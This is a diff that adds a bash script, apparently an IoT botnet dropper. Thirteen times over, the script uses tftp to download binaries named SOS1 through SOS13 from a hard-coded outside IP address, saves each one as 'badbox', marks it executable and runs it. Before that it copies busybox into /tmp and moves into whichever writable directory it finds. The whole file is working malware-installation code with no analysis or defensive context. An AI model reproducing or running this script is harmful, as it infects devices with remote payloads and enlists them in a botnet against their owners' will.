@@ -1,0 +1,16 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS1 -g 185.145.131.173;cat SOS1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS2 -g 185.145.131.173;cat SOS2 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS4 -g 185.145.131.173;cat SOS4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS3 -g 185.145.131.173;cat SOS3 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS5 -g 185.145.131.173;cat SOS5 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS6 -g 185.145.131.173;cat SOS6 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS7 -g 185.145.131.173;cat SOS7 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS8 -g 185.145.131.173;cat SOS8 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS9 -g 185.145.131.173;cat SOS9 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS10 -g 185.145.131.173;cat SOS10 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS11 -g 185.145.131.173;cat SOS11 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS12 -g 185.145.131.173;cat SOS12 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SOS13 -g 185.145.131.173;cat SOS13 >badbox;chmod +x *;./badbox
